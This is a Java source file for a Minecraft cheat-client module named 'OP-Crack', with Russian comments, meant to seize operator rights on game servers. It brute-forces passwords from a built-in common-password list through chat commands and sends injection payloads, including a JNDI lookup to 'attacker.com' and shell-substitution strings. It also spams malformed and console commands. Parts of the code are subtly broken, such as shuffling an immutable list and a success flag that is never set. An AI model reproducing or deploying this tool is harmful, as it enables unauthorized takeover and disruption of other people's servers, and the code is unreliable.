package hmcore.modules.combat;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import hmcore.HM_CORE;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class OPCrack extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final SettingGroup sgBruteforce = settings.createGroup("Bruteforce");
    private final SettingGroup sgAdvanced = settings.createGroup("Advanced");

    // --- ОСНОВНЫЕ НАСТРОЙКИ ---

    public final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("Режим взлома")
            .defaultValue(Mode.Bruteforce)
            .build()
    );

    public final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
            .name("delay")
            .description("Задержка между попытками (мс)")
            .defaultValue(1000)
            .min(100)
            .max(5000)
            .sliderMax(5000)
            .build()
    );

    public final Setting<Integer> maxAttempts = sgGeneral.add(new IntSetting.Builder()
            .name("max-attempts")
            .description("Максимальное количество попыток")
            .defaultValue(100)
            .min(10)
            .max(1000)
            .sliderMax(1000)
            .build()
    );

    public final Setting<Boolean> stopOnSuccess = sgGeneral.add(new BoolSetting.Builder()
            .name("stop-on-success")
            .description("Остановить при успехе")
            .defaultValue(true)
            .build()
    );

    // --- НАСТРОЙКИ БРУТФОРСА ---

    public final Setting<List<String>> passwordList = sgBruteforce.add(new StringListSetting.Builder()
            .name("password-list")
            .description("Список паролей для перебора (через запятую)")
            .defaultValue("admin,password,12345,root,op,server,letmein,123456,password123,admin123")
            .build()
    );

    public final Setting<Boolean> useCommonPasswords = sgBruteforce.add(new BoolSetting.Builder()
            .name("use-common-passwords")
            .description("Использовать встроенный список популярных паролей")
            .defaultValue(true)
            .build()
    );

    public final Setting<Boolean> addNumbers = sgBruteforce.add(new BoolSetting.Builder()
            .name("add-numbers")
            .description("Добавлять числа к паролям (123, 1234, 2024, ...)")
            .defaultValue(true)
            .build()
    );

    public final Setting<Boolean> addYear = sgBruteforce.add(new BoolSetting.Builder()
            .name("add-year")
            .description("Добавлять текущий год к паролям")
            .defaultValue(true)
            .build()
    );

    // --- ПРОДВИНУТЫЕ ---

    public final Setting<Boolean> useProxy = sgAdvanced.add(new BoolSetting.Builder()
            .name("use-proxy")
            .description("Использовать прокси (не реализовано)")
            .defaultValue(false)
            .build()
    );

    public final Setting<Boolean> randomizeOrder = sgAdvanced.add(new BoolSetting.Builder()
            .name("randomize-order")
            .description("Случайный порядок паролей")
            .defaultValue(true)
            .build()
    );

    // --- ENUM ---
    public enum Mode {
        Bruteforce("Брутфорс"),
        CommandInjection("Инъекция команд"),
        NullPointer("NullPointer эксплойт"),
        ConsoleSpam("Спам консоли");

        private final String name;

        Mode(String name) {
            this.name = name;
        }

        @Override
        public String toString() {
            return name;
        }
    }

    // --- ПЕРЕМЕННЫЕ ---
    private int attemptCount = 0;
    private long lastAttemptTime = 0;
    private boolean success = false;
    private final Random random = new Random();
    private List<String> passwords = new ArrayList<>();

    // --- КОНСТРУКТОР ---
    public OPCrack() {
        super(HM_CORE.CATEGORY, "OP-Crack", "Попытка получить OP-права (ЭКСПЛОЙТ!)");
    }

    @Override
    public void onActivate() {
        attemptCount = 0;
        success = false;
        lastAttemptTime = 0;
        generatePasswords();
        ChatUtils.warn("§cOP-Crack активирован! Используйте на свой страх и риск.");
        ChatUtils.info("§7Паролей загружено: " + passwords.size());
    }

    @Override
    public void onDeactivate() {
        if (success) {
            ChatUtils.info("§aOP-Crack успешно завершён!");
        } else {
            ChatUtils.info("§cOP-Crack остановлен. Попыток: " + attemptCount);
        }
    }

    // --- ГЕНЕРАЦИЯ ПАРОЛЕЙ ---
    private void generatePasswords() {
        passwords.clear();

        // Основной список
        List<String> basePasswords = new ArrayList<>(passwordList.get());

        // Встроенный список популярных паролей
        if (useCommonPasswords.get()) {
            basePasswords.addAll(getCommonPasswords());
        }

        // Добавление чисел
        if (addNumbers.get()) {
            List<String> withNumbers = new ArrayList<>();
            for (String pwd : basePasswords) {
                withNumbers.add(pwd + "123");
                withNumbers.add(pwd + "1234");
                withNumbers.add(pwd + "1");
                withNumbers.add(pwd + "2024");
                withNumbers.add(pwd + "2025");
            }
            basePasswords.addAll(withNumbers);
        }

        // Добавление года
        if (addYear.get()) {
            List<String> withYear = new ArrayList<>();
            for (String pwd : basePasswords) {
                withYear.add(pwd + "2024");
                withYear.add(pwd + "2025");
                withYear.add(pwd + "2026");
            }
            basePasswords.addAll(withYear);
        }

        // Уникальные значения
        passwords = basePasswords.stream().distinct().toList();

        // Случайный порядок
        if (randomizeOrder.get()) {
            for (int i = passwords.size() - 1; i > 0; i--) {
                int j = random.nextInt(i + 1);
                String temp = passwords.get(i);
                passwords.set(i, passwords.get(j));
                passwords.set(j, temp);
            }
        }

        // Ограничение по максимальному количеству
        if (passwords.size() > maxAttempts.get()) {
            passwords = passwords.subList(0, maxAttempts.get());
        }
    }

    // --- ВСТРОЕННЫЙ СПИСОК ПОПУЛЯРНЫХ ПАРОЛЕЙ ---
    private List<String> getCommonPasswords() {
        List<String> common = new ArrayList<>();
        common.add("admin");
        common.add("password");
        common.add("12345");
        common.add("root");
        common.add("op");
        common.add("server");
        common.add("letmein");
        common.add("123456");
        common.add("password123");
        common.add("admin123");
        common.add("qwerty");
        common.add("abc123");
        common.add("adminadmin");
        common.add("minecraft");
        common.add("serveradmin");
        common.add("console");
        common.add("admin1");
        common.add("pass");
        common.add("123456789");
        common.add("123123");
        common.add("000000");
        common.add("111111");
        common.add("1234567");
        common.add("7654321");
        common.add("12345678");
        common.add("87654321");
        common.add("iloveyou");
        common.add("monkey");
        common.add("dragon");
        common.add("master");
        return common;
    }

    // --- ТИК ---
    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null || mc.world == null) return;
        if (success && stopOnSuccess.get()) return;
        if (System.currentTimeMillis() - lastAttemptTime < delay.get()) return;
        if (attemptCount >= passwords.size() && passwords.size() > 0) {
            ChatUtils.warn("Все пароли перебраны. Успеха нет.");
            toggle();
            return;
        }

        String password = passwords.get(attemptCount);
        attemptCount++;

        switch (mode.get()) {
            case Bruteforce -> tryBruteforce(password);
            case CommandInjection -> tryCommandInjection();
            case NullPointer -> tryNullPointer();
            case ConsoleSpam -> tryConsoleSpam();
        }

        lastAttemptTime = System.currentTimeMillis();

        if (attemptCount % 10 == 0) {
            ChatUtils.info("§7Попыток: " + attemptCount + "/" + passwords.size());
        }
    }

    // --- БРУТФОРС ---
    private void tryBruteforce(String password) {
        if (mc.player == null) return;
        // Попытка войти в консоль через /op <пароль> (не работает на нормальных серверах)
        String[] commands = {
                "/op " + password,
                "/admin " + password,
                "/setop " + password,
                "/give op " + password,
                "/sudo " + password + " op",
                "/console " + password
        };
        String cmd = commands[random.nextInt(commands.length)];
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket(cmd));
        if (attemptCount % 20 == 0) {
            ChatUtils.warn("Отправлена команда: " + cmd);
        }
    }

    // --- ИНЪЕКЦИЯ КОМАНД ---
    private void tryCommandInjection() {
        if (mc.player == null) return;
        // Попытка инъекции через chat
        String[] payloads = {
                "/op ${jndi:ldap://attacker.com/a}",
                "/op $(sleep 10)",
                "/op %{printf(\"admin\")}",
                "/op `id`"
        };
        String payload = payloads[random.nextInt(payloads.length)];
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket(payload));
    }

    // --- NULL POINTER ---
    private void tryNullPointer() {
        if (mc.player == null) return;
        // Отправка пустой команды
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/"));
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/ "));
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/\n"));
        mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket("/null"));
    }

    // --- СПАМ КОНСОЛИ ---
    private void tryConsoleSpam() {
        if (mc.player == null) return;
        // Спам командами
        String[] spam = {
                "/help",
                "/list",
                "/ping",
                "/version",
                "/plugins",
                "/?",
                "/ " + "a".repeat(100)
        };
        for (String cmd : spam) {
            mc.player.networkHandler.sendPacket(new ChatMessageC2SPacket(cmd));
        }
    }

    // --- ИНФОРМАЦИЯ В HUD ---
    @Override
    public String getInfoString() {
        if (success) return "§aУСПЕХ!";
        if (attemptCount > 0) return attemptCount + "/" + passwords.size();
        return "§cОжидание...";
    }
}
